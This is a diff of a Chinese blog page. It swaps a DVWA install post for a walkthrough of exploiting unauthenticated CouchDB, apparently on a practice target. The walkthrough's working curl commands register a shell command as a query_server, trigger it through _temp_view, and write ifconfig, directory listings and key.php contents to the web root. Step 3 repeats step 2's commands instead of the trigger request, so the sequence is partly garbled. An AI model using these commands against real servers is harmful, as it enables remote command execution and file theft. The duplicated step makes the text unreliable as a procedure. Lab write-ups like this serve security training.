@@ -93,22 +93,42 @@
         
   <article class="post">
     <div class="post-title">
-      <h2 class="title">DVWA安装</h2>
+      <h2 class="title">CouchDB未授权访问</h2>
        
-        <p>DVWA</p>
-      
-        <p>test</p>
+        <p>CouchDB未授权访问</p>
       
     </div>
      <div class="post-meta">
-      <span class="post-time">2018-09-18</span>
+      <span class="post-time">2018-10-15</span>
     </div>
     <div class="post-content">
-      <h1 id="1-下载-XAMPP"><a href="#1-下载-XAMPP" class="headerlink" title="1.下载 XAMPP"></a>1.下载 XAMPP</h1><h2 id="地址：https-www-apachefriends-org-zh-cn-download-html"><a href="#地址：https-www-apachefriends-org-zh-cn-download-html" class="headerlink" title="地址：https://www.apachefriends.org/zh_cn/download.html"></a>地址：<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></h2>
+      <blockquote>
+<h4 id="ip-219-153-49-228-端口：49489-apache服务端口-44267"><a href="#ip-219-153-49-228-端口：49489-apache服务端口-44267" class="headerlink" title="ip:219.153.49.228   端口：49489(apache服务端口)  44267"></a>ip:219.153.49.228   端口：49489(apache服务端口)  44267</h4></blockquote>
+<h5 id="1-新增query-server配置，这里执行ifconfig命令"><a href="#1-新增query-server配置，这里执行ifconfig命令" class="headerlink" title="1.新增query_server配置，这里执行ifconfig命令"></a>1.新增query_server配置，这里执行ifconfig命令</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/sbin/ifconfig &gt;/var/www/html/a&quot;&apos;【要打两遍】
+</code></pre><h5 id="2-新建一个临时表，插入一条记录"><a href="#2-新建一个临时表，插入一条记录" class="headerlink" title="2.新建一个临时表，插入一条记录"></a>2.新建一个临时表，插入一条记录</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/vultest&apos;
+curl -X PUT &apos;http://219.153.49.228:44267/vultest/vul&apos; -d &apos;{&quot;_id&quot;:&quot;25ea803643bfdf11a87f851d0f8cea83&quot;}&apos;    
+</code></pre><h5 id="3-调用query-server处理数据"><a href="#3-调用query-server处理数据" class="headerlink" title="3.调用query_server处理数据"></a>3.调用query_server处理数据</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/vultest&apos;
+curl -X PUT &apos;http://219.153.49.228:44267/vultest/vul&apos; -d &apos;{&quot;_id&quot;:&quot;25ea803643bfdf11a87f851d0f8cea83&quot;}&apos;
+</code></pre><h5 id="4-看是否能够成功回显出ifconfig内容，图片中成功回显"><a href="#4-看是否能够成功回显出ifconfig内容，图片中成功回显" class="headerlink" title="4. 看是否能够成功回显出ifconfig内容，图片中成功回显"></a>4. 看是否能够成功回显出ifconfig内容，图片中成功回显</h5><p><img src="图片1.jpg" alt="tupian1 "> </p>
+<h5 id="5-查看ls和cat命令路径"><a href="#5-查看ls和cat命令路径" class="headerlink" title="5. 查看ls和cat命令路径"></a>5. 查看ls和cat命令路径</h5><pre><code>root@kali:~# which ls
+/bin/ls
+root@kali:~# which cat
+/bin/cat
+</code></pre><h5 id="6-查看目录"><a href="#6-查看目录" class="headerlink" title="6.查看目录"></a>6.查看目录</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/bin/ls &gt;/var/www/html/a&quot;&apos;【要打两遍】
+curl -X POST &apos;http://219.153.49.228:44267/vultest/_temp_view?limit=11&apos; -d &apos;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&apos; -H &apos;Content-Type: application/json&apos;【执行】
+</code></pre><p><img src="图片2.png" alt="tupian2 ">   </p>
+<h5 id="7-查看key-php内容"><a href="#7-查看key-php内容" class="headerlink" title="7.查看key.php内容"></a>7.查看key.php内容</h5><pre><code>curl -X PUT &apos;http://219.153.49.228:44267/_config/query_servers/cmd&apos; -d &apos;&quot;/bin/cat  key.php&gt;/var/www/html/a&quot;&apos;【要打两遍】
+curl -X POST &apos;http://219.153.49.228:44267/vultest/_temp_view?limit=11&apos; -d &apos;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&apos; -H &apos;Content-Type: application/json&apos;【执行】
+</code></pre><p><img src="图片3.png" alt="tupian3 ">   </p>
+
     </div>
   </article>
   <div class="post-nav">
     <div class="post-nav-next post-nav-item">
+      
+        <a href="/2018/10/12/文件上传漏洞总结/" rel="next" title="文件上传漏洞总结">
+          <i class="fa fa-chevron-left"></i> 文件上传漏洞总结
+        </a>
       
     </div>
 
@@ -116,8 +136,8 @@
 
     <div class="post-nav-prev post-nav-item">
     
-        <a href="/2018/10/08/hello-world/" rel="prev" title="Hello World">
-          Hello World <i class="fa fa-chevron-right"></i>
+        <a href="/2018/10/15/rsync未授权访问/" rel="prev" title="rsync未授权访问">
+          rsync未授权访问 <i class="fa fa-chevron-right"></i>
         </a>
       
     </div>
